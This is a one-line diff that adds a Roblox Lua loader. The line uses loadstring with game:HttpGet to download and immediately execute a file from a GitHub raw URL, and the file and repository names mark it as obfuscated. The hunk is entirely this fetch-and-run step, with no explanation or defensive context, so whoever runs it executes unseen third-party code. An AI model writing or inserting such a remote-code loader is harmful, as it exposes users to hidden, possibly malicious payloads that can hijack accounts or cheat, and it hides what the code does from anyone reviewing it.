@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vzx7376/Obfuscate/refs/heads/main/25ms_obf.lua%20(5).txt"))()
